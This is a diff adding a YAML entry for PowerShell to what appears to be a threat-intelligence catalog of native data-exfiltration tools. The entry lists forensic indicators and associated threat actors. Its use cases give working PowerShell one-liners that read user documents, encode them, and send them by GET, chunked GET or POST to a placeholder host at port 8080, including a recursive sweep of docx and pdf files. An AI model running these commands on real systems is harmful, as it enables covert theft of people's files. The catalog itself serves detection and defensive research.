@@ -1,0 +1,78 @@
+Name: PowerShell
+Description: Native Windows command-line shell and scripting language, abused for
+  fileless and stealthy exfiltration using built-in HTTP functions.
+Category: native
+Platform:
+- Windows
+Execution:
+- cli
+Capabilities:
+- http-upload
+- url-encoding
+- base64-encoding
+- fileless-exfiltration
+- chunked-upload
+Stealth:
+- living-off-the-land
+- script-obfuscation
+- no-disk-artifacts
+Forensics:
+  BinaryLocations:
+  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  CommandLineArgs:
+  - Invoke-WebRequest
+  - WebClient
+  - UploadData
+  - -Method
+  - -Body
+  - '[uri]::EscapeDataString'
+  - '[Convert]::ToBase64String'
+  - '[System.IO.File]::ReadAllBytes'
+  NetworkArtifacts:
+  - HTTP GET/POST requests to external servers
+  - Suspicious Base64 strings in URLs
+  - Frequent small GET requests in short intervals
+  ConfigFiles: []
+  ScheduledTask: []
+  RegistryPersistence: []
+Tags:
+- stealth
+- commonly-used
+- remote-execution
+ThreatActors:
+- vice-society
+- unc5527
+UseCases:
+- Title: Simple file download via GET
+  Description: Download a file using PowerShell's Invoke-WebRequest.
+  Command: Invoke-WebRequest -Uri "http://<ip>:8080/file.txt" -OutFile "$env:USERPROFILE\Downloads\file.txt"
+- Title: Exfiltrate small text via URL-encoded GET
+  Description: Read content from file, URL-encode it, and send via GET parameter.
+  Command: '[uri]::EscapeDataString((Get-Content "$env:USERPROFILE\Documents\data.csv"
+    | Out-String)); Invoke-WebRequest -Uri "http://<ip>:8080/exfil?data=$encoded"'
+- Title: Base64 encode and send via GET
+  Description: Base64-encode file content and exfiltrate using GET request.
+  Command: '[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content
+    "$env:USERPROFILE\Documents\data.csv" | Out-String))); Invoke-WebRequest -Uri
+    "http://<ip>:8080/exfil?b64=$b64"'
+- Title: Chunked GET exfiltration of large file
+  Description: Split a Base64-encoded file into chunks and send them as individual
+    GET requests.
+  Command: foreach ($chunk in $chunks) { $encoded = [uri]::EscapeDataString($chunk);
+    Invoke-WebRequest -Uri "http://<ip>:8080/exfil?chunk=$encoded&part=$i" }
+- Title: POST body exfiltration of raw text
+  Description: Send raw file content in POST body using Invoke-WebRequest.
+  Command: Invoke-WebRequest -Uri "http://<ip>:8080/exfil" -Method POST -Body (Get-Content
+    "$env:USERPROFILE\\Documents\\data.csv" -Raw)
+- Title: POST file upload using byte array
+  Description: Send file bytes using POST with application/octet-stream content type.
+  Command: $bytes = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Documents\file.zip");
+    (New-Object System.Net.WebClient).UploadData("http://<ip>:8080/exfil", $bytes)
+- Title: Recursive document exfiltration with POST (Vice Society style)
+  Description: Find files with specific extensions and send them to remote server
+    using POST.
+  Command: $files = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include "*.docx","*.pdf"
+    -Recurse; foreach ($f in $files) { $c = [System.IO.File]::ReadAllBytes($f.FullName);
+    (New-Object System.Net.WebClient).UploadData("http://<ip>:8080/upload/$($f.Name)",
+    "POST", $c) }
+LastModified: '2025-10-01'
